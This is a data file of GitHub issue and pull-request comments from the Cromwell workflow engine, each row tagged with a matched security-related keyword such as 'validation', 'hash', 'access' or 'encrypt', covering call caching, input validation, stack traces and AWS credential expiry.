Security,"FYI this was a key item in feedback from our WDL sessions in the UK workshops; having to specify accessory files is a big source of annoyance. Not that it's any surprise, but we're definitely getting confirmation from real users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-317858944:97,access,accessory,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-317858944,2,['access'],['accessory']
Security,"FYI- @cjllanwarne / @mcovarr: After working with the `GcsPath` tests I'm backing away from trying to figure out if a `GcsPath` is ""valid"" if it's a bucket only. Path-theory is just too complex to think about right now. Happy to give examples IRL, but mindbenders include:. - `""gs://bucket/""`; - `""gs://bucket""`; - `""gs://bucket/.""`; - `""gs://bucket/ ""`; - etc. I'll leave the validation in `GcsBatchIoCommand` though, ensuring we never issue requests to `list` instead of `get` objects.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906:376,validat,validation,376,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906,1,['validat'],['validation']
Security,"FYI: Places we allow expressions:. | Position | Notes |; | --- | --- |; | Workflow declarations | Inject a task with matching dependencies. Use ""Local"" backend... But what if Local is not configured (e.g. FC) |; | Task declarations | Use the same backend. Inject a preceeding task (maybe evaluate everything at once?) |; | Task outputs | Use the same backend We'd need to insert a new task afterwards and rewire following tasks. We'd also need to back-fill results once they're known |; | Subexpressions | In the same context as the main expression |; | Scatter signatures | Actually this one doesn't work right now (sad!) but we could probably treat them just like workflow declarations |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377:98,Inject,Inject,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377,2,['Inject'],['Inject']
Security,Fail validation if call inputs will be ignored,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2967:5,validat,validation,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2967,1,['validat'],['validation']
Security,"Failure metadata will look something like:. ```; ""failures"": [{; ""failure"": ""Task 874ad75a-e19e-4b53-8225-746df1436c51:ValidateAggregatedSamFile was preempted for the 1st time. The call will be restarted with another preemptible VM (max preemptible attempts number is 3).\nError code 10. Message: Some(14: VM ggp-15150083938845849899 stopped unexpectedly.)"",; ""timestamp"": ""2016-12-18T05:54:07.296Z""; }],; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1893:119,Validat,ValidateAggregatedSamFile,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1893,1,['Validat'],['ValidateAggregatedSamFile']
Security,FaultHandling.handleFailure$(FaultHandling.scala:254); 	at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachi,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6008,Validat,ValidatedRuntimeAttributesBuilder,6008,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,"Feature request: allow call caching to work across different engines. Currently, only calls run on the same engine can be reused. But if task inputs and docker hash are the same, results should be reusable across engines. This might require copying files across filesystems; but if there is a Local filesystem, then any file can be copied first to that and then to the target filesystem.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4616:160,hash,hash,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4616,1,['hash'],['hash']
Security,"Feedback from today's workshop: `womtool validate` uselessly prints a few newlines on successful exit. Various workshop participants thought:; 1. It should exit with no output to harmonize with Unix CLI tool conventions; 2. It should confirm success in a way that is obvious to users who are e.g. biologists first, programmers second. Either would be an improvement over the current state. cc @rmeffan @ndbolliger ; <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4040:41,validat,validate,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4040,2,"['PASSWORD', 'validat']","['PASSWORDS', 'validate']"
Security,"Figuring that out is what this ticket is for :); Right now it involves at least having a cromwell available, a github access token, running the release WDL, monitoring that everything goes well and that the WDL succeeds. This could be automated using jenkins for example.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-333242328:118,access,access,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-333242328,1,['access'],['access']
Security,File hash caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4143:5,hash,hash,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4143,1,['hash'],['hash']
Security,File hash short-circuiting,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316:5,hash,hash,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316,1,['hash'],['hash']
Security,File hashing exception with CWL run on SLURM,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:5,hash,hashing,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['hash'],['hashing']
Security,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:283,hash,hash,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592,4,['hash'],['hash']
Security,"First implementation of a pluggable LocalBackend. This is more a light basic implementation and a starting point to iterate over.; What is implemented : ; - Support for non-docker jobs; - Support for docker jobs; - Support for ""ContinueOnReturnCode"" ""FailOnStderr"" and ""docker"" runtime attributes; - Engine functions; - Abort. Things to think about:; - How to share code between backends ? runtime attributes validation, engine functions, shared filesystem code.. ; - Testing. Note: some code is duplicated from the engine as it's still used by the current non-PBE implementation. Eventually this will replace all local backend code in the engine. Currently adding more tests for ; - [x] abort. ~~\- [ ] engine functions~~; - [x] input localization; - [x] expression evaluation; - [x] coercion ; - [x] scatter",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/712:409,validat,validation,409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/712,1,['validat'],['validation']
Security,"Fix Docker hash throttling, remove deprecation warning [BT-336]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6437:11,hash,hash,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6437,1,['hash'],['hash']
Security,Fix Travis Encryptions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1953:11,Encrypt,Encryptions,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1953,1,['Encrypt'],['Encryptions']
Security,Fix input validation and add to womtool,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3473:10,validat,validation,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3473,1,['validat'],['validation']
Security,Fix member access on scatter variables,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3763:11,access,access,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3763,1,['access'],['access']
Security,Fix name collision issue in call block member access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4095:46,access,access,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4095,1,['access'],['access']
Security,"Fix/update for [WX-1210](https://broadworkbench.atlassian.net/browse/WX-1210). Turns out that the `head_commit` attribute is not available on `pull_request` actions, which is why the JIRA ID check kept failing. I'm opting to use `github.event.pull_request.title` which is accessible on `pull_request`. [WX-1210]: https://broadworkbench.atlassian.net/browse/WX-1210?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7184:272,access,accessible,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7184,1,['access'],['accessible']
Security,Fixed bug with actor system being created and not stopped if exception occurs during validation of command line arguments BA-4061,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236:85,validat,validation,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236,1,['validat'],['validation']
Security,"Fixed duplicate dependencies for core module.; Added tighter yaml validation, including looking for duplicate yaml keys.; Added swagger validation to swagger spec.; Fixed broken cromwell.yaml.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/792:66,validat,validation,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/792,2,['validat'],['validation']
Security,"Fixed the [proof of concept code](https://github.com/broadinstitute/cromwell/compare/develop...rhpvorderman:relativeImports). Now the WOMTOOL is able to handle absolute paths correctly. I can run `java -jar /home/ruben/test/base/womtool-31-1df94fa-SNAP.jar validate /home/ruben/test/base/workflow.wdl ` in any directory on the filesystem and get the same result. However cromwell still uses $PWD to evaluate the base directory. I can see the WOMtool uses the following code to load the WDL file:; ```scala; private[this] def loadWdl(path: String)(f: WdlNamespace => Termination): Termination = {; WdlNamespace.loadUsingPath(Paths.get(path), None, None) match {; case Success(namespace) => f(namespace); case Failure(r: RuntimeException) => throw new RuntimeException(""Unexpected failure mode"", r); case Failure(t) => UnsuccessfulTermination(t.getMessage); }; }; ```; But for cromwell there does not seem to be such a straightforward loading of the wdlfile. Can somebody point me to this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047:257,validat,validate,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047,1,['validat'],['validate']
Security,Fmc 725 validation exp eval. Closes #725.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/746:8,validat,validation,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/746,1,['validat'],['validation']
Security,Fmc 726 memory validation. Closes #726.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/741:15,validat,validation,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/741,1,['validat'],['validation']
Security,"Following the docs at https://github.com/broadinstitute/cromwell#runtime-attributes, I'd like to be able to pass runtime attributes as the inputs to a task, for example:; ```; task iRun {; String runtimeMemory; Int runtimeCpu; command {; echo ""so far away""; }; output {; String out = read_string(stdout()); }; runtime {; memory: runtimeMemory; #cpu: runtimeCpu; }; }; ```; When using a configurable backend, I can confirm this works for the String type attribute `memory` but not the Int type `cpu`: running the above with the cpu runtime attribute uncommented I get this in the logs:; ```; [ERROR] [11/24/2016 10:49:13.299] [cromwell-system-akka.dispatchers.engine-dispatcher-22] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow beb03899-5f22-4f2c-8a85-d619a2d8a969 failed (during InitializingWorkflowState): java.lang.IllegalArgumentException: Task iRun has an invalid runtime attribute cpu = runtimeCpu; ```. My custom backend application.conf section: ; ```; PBS { ; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config { ; runtime-attributes = """"""; Int cpu = 1 ; Int memory_mb = 1000; String? pbs_email; String? pbs_queue; String pbs_walltime = ""1:00:00""; """"""; ...; }; }; ```. I thought it might be because of the special nature of the `cpu` runtime attribute, but I tested with a different custom runtime attribute `Int pbs_cpu` and got the same result, so my guess is that it's the Int type that is the problem. I am working around this by defining `String pbs_cpu` which is then interpreted as an expression in the runtime block, as documented, but it feels wrong because the value should really be validated as an Int.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1702:1697,validat,validated,1697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1702,1,['validat'],['validated']
Security,"Following the pattern of the GCP metadata actor, these actors will send Cromwell metadata to both the metadata database as well as to AWS SNS pubsub service. By sending to SNS users can setup custom accessory behavior without needing to modify Cromwell by creating subscribers to the SNS topic. Example use cases are alerting users when jobs succeed (or fail), updating slack channels, tagging workflow output S3 objects with workflow metadata. By creating AWS Lambda function subscribers, very flexible event driven actions can be taken.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5748:199,access,accessory,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5748,1,['access'],['accessory']
Security,"For FC provenance tracking we need to keep an eye on the file hashes of workflow inputs. My understanding is that call-caching stores the CRC32c of each _call_ input, but it's difficult to trace those hashes back to workflow inputs. Could you store the hashes of workflow inputs at job submit time and throw them in the workflow metadata?. Ping @abaumann for prio but I don't think it's super urgent.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629:62,hash,hashes,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629,3,['hash'],['hashes']
Security,"For `Object`s, `Map`s and `Pair`s, and perhaps `Array`s. Eg We need to be able to distinguish between `p.left`, accessing the left hand side of a pair, and `p.left` accessing the `left` output of a task called `p`. Make sure member access works for:; - [X] Maps; - [X] Arrays; - [x] Pairs; - ~~Objects~~ Not Supported (but it's no longer the member access bit holding us back)!. Then reinstate tests:; - [x] `scatter_chain`; - ~~`if_then_else_expressions`~~ Punted to #2860 ; - [X] `array_and_map_indexing` (enhanced!)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2861:112,access,accessing,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2861,4,['access'],"['access', 'accessing']"
Security,"For endpoints which provide a single workflow ID to get data, e.g. metadata, request if this workflow ID is accessible to the principal (see #2131). If so pass through to Cromwell, otherwise reject",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2136:108,access,accessible,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2136,1,['access'],['accessible']
Security,"For more specific details see the DB meeting notes. Remove the biz logic-y portions of the DataAccess trait and move them into something alongside/in the appropriate locations (metadata store, kv store, etc) and have that code take a SlickDatabase. Move globalDataAccess to be a globally (in core package? Something like that) accessible singleton SlickDatabase instance, which the individual ex-DataAccess stuff can use. The DataAccess trait also had a withRetry function which does seem inappropriate for SlickDatabase, at the moment it's just a wrapper around the main withRetry w/ some defaults set - perhaps that lives w/ the global SlickDatabase? Perhaps allow individual ex-DataAccess stuff set their own? Up to you.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1177:327,access,accessible,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1177,1,['access'],['accessible']
Security,"For now at least, the implementation isn’t that big of a deal as long as it’s pushbutton GCP stuff. The goal is to store the JSON events coming out of PubSub as-is in a fashion that we can access them in the future as necessary. We don’t need efficient querying of these events but we do need the ability to easily get all the events associated with a workflow. Cloud Datastore seems like it’d work (for instance, kind being workflow ID and entity being the metadatum) but I don’t really know. We could also just do something like store these in a google bucket. Let’s not get too complicated here, the idea is to find something simple and verify that it’s feasible over time. Once this is squared away, enhance the application from #3244 to also dump the events **as-is** into this event store w/o modification.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3246:189,access,access,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3246,1,['access'],['access']
Security,"For now treat this like refresh tokens, e.g. encrypted, deleted afterwards, etc. user provides json key via workflow options.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2669:45,encrypt,encrypted,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2669,1,['encrypt'],['encrypted']
Security,"For the integration tests Cromwell runs, it would be good for the test definition to assert the hash of the expected output and actual output. This particular case is to ensure that there are no changes to the engine that could cause the contents of the outputs to change over time, and alert the team when such a case happens.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4904:96,hash,hash,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4904,1,['hash'],['hash']
Security,"For the new /describe endpoint being added for the purposes of Womtool-as-a-Service, implement the ability to validate a given workflow source file. AC: Given a WDL workflow source file (not http url), return whether its a valid WDL workflow, and provide errors if its invalid. ```; {; ""valid"": true,; ""errors"": [; ""The 'errors' field will be filled if 'valid' is false"",; ""We might also provide warnings to a 'valid' workflow here"",; ""Otherwise, 'errors' will be empty or unspecified""; ]; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4433:110,validat,validate,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4433,1,['validat'],['validate']
Security,"For the person (even if it's me) who picks this up -> I did a quick poke around and I **think** the reason for this is that our original validation in `PartialWorkflowSources` appears to be getting run through a YAML parser and tabs aren't valid YAML, but are ok in JSON.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379127391:137,validat,validation,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379127391,1,['validat'],['validation']
Security,"For those that come across this PR in the future, a subset of the [docs](https://docs.codecov.io/v4.3.6/docs) referred to in this PR:; - Commit Status; - Project Status; - [Target](https://docs.codecov.io/v4.3.6/docs/commit-status#section-target); - [Threshold](https://docs.codecov.io/v4.3.6/docs/commit-status#section-threshold); - [Base](https://docs.codecov.io/v4.3.6/docs/commit-status#section-base); - [Patch Status](https://docs.codecov.io/v4.3.6/docs/commit-status#section-patch-status); - Coverage Configuration; - [Range](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-range); - [Rounding](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-rounding); - Notifications; - [Slack](https://docs.codecov.io/v4.3.6/docs/notifications#section-slack); - Pull Request Comments; - [Disable comment](https://docs.codecov.io/v4.3.6/docs/pull-request-comments#section-disable-comment) (aka Github emails); - CodeCov YAML; - [Default Branch](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-default-branch); - [Validate your repository yaml](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-validate-your-repository-yaml)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206:1052,Validat,Validate,1052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206,2,"['Validat', 'validat']","['Validate', 'validate-your-repository-yaml']"
Security,"Formation set up provided in https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/cromwell/cromwell-aio.template.yaml. ; In summary, the set up is a EC2 instance running `java -jar cromwell.jar server` and calling AWS Batch to run WDL workflow using an attached EC2 instance profile. . I have no issue posting workflows and getting results. However, after a certain period of time, I will get `The security token included in the request is expired` error message logged by the cromwell server when I try to post a job. ; - I have checked that `~/.aws` and the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variable don't exist. ; - If I kill the server and restart it again, the server seem to pick up the new security token and I can post workflow again. ; - Checking `cromwell.config` (pasted below), all authentication methods are set to `default` which is documented to mean it is using `DefaultCredentialProvider` in the AWS Java SDK. That should be refreshing the security token? . Is this unexpected behaviour or did I configure something wrongly? . Thanks for your help!. ----. Config file for the cromwell serve:; ```; include required(classpath(""application"")). webservice {; interface = localhost; port = 8000; }. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""ap-southeast-2""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""XXXX""; auth = ""default""; default-runtime-attributes { queueArn = ""XXXXX"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; workflow-options {; workflow-log-dir = ""cromwell-workflow-logs""; workflow-log-temporary = false; }. call-caching {; enabled = true; invalidate-bad-cache-resu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162:1101,secur,security,1101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162,1,['secur'],['security']
Security,"Found during workshop - error formatter caret points to the wrong thing. Looks like a tabs vs. spaces thing.; ```; workflow HelloWorld {. 	call WriteGreetings; }. task WriteGreeting {. 	command {; 		echo ""Hello World""; 	}; 	output {; 		File outfile = stdout(); 	}; }; ```; ```; (gatk) root@5721c54d094c:/gatk/workshop_bundle/workshop_bundle# java -jar jars/womtool-34.jar validate hello_world/hello_world_0.wdl ; ERROR: Call references a task (WriteGreetings) that doesn't exist (line 3, col 7). 	call WriteGreetings; ^; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4041:372,validat,validate,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4041,1,['validat'],['validate']
Security,"Found during workshop - incomprehensible error output.; ```; workflow HelloWorld {. 	call WriteGreeting; }. task WriteGreeting {. 	command {; 		echo ""Hello World""; 	}; 	output {; 		File outfile = asdf(); 	}; }; ```; ```; (gatk) root@5721c54d094c:/gatk/workshop_bundle/workshop_bundle# java -jar jars/womtool-34.jar validate hello_world/hello_world_0.wdl ; wdl.draft2.model.expression.WdlStandardLibraryFunctionsType.asdf(scala.collection.Seq); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4042:315,validat,validate,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4042,1,['validat'],['validate']
Security,"From @jsotobroad. Even though getting MD5 from GCS is fast for call caching, when you do 20k of these it does take a bunch of time. Would it be possible to adopt a strategy like the ""File"" hashing strategy if the user wanted?. from Kris: especially for interior (e.g. from another task) inputs where we can be confident it hasn't been fiddled with. from @cjllanwarne : question: since call caching actually copies files, it's the MD5 we really need because we copy outputs around",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623:189,hash,hashing,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623,1,['hash'],['hashing']
Security,"From Henry --. My comment is a little different than the commenter above. So I will try to provide some context in order to differentiate. If one looks at Cromwell as being part of a larger application infrastructure/service such as a Genomics Pipeline where sequenced data is constantly being processed through the system or providing a service where users on the Internet can launch workflows ""as a Service"" - whenever they way. In these systems, uptime and availability are critical - at all times. Below are several scenarios where I could see running multiple Cromwells would be very beneficial. High availability:; Having multiple Cromwells running where jobs are ""load balanced"" between them would allow us to continue operate when there are systems issues or failures with one of the Cromwell instances. Zero-downtime deployments:; Supporting multiple Cromwells running different versions of the code, could provide the ability to upgrade Cromwell with little or no user impact. Essentially the new version is deployed to a new server, it is started up and at an appropriate time traffic (via a load balancer or proxy maybe) is directed away from the ""old version"" Cromwell to the new. Similar to item 2: being able to introduce infrastructure changes (host OS, security patches, host resizing,..) more seamlessly:; If I can support multiple instances of Cromwell, I can build a new instance of the host with all the updates and changes I require - deploy cromwell to the new node and cut over. A corollary to this request is also the ability to ""move"" workflows from one Cromwell instance to another. Maybe this is just workflows not in flight or active - but waiting to run. This capability could make it easier to retire older cromwell instances (once multiple cromwell instances support is in place). Some workflows may take days to run, being able to ""relocate"" these workflows to the ""new"" cromwell - allows us to decommission ""old"" cromwells faster.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/691:1270,secur,security,1270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/691,1,['secur'],['security']
Security,From a quick investigation it looks like the EJEA would use the default supervision strategy here. The PAPI BJEA would be restarted and then possibly nothing would happen since the broken disks runtime attribute prevented the job from actually starting. Should be easy enough to reproduce. ```; ERROR akka.actor.OneForOneStrategy - Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk SIZE TYPE' or '/mount/point SIZE TYPE' but got: '10 HDD'; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk SIZE TYPE' or '/mount/point SIZE TYPE' but got: '10 HDD'; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at 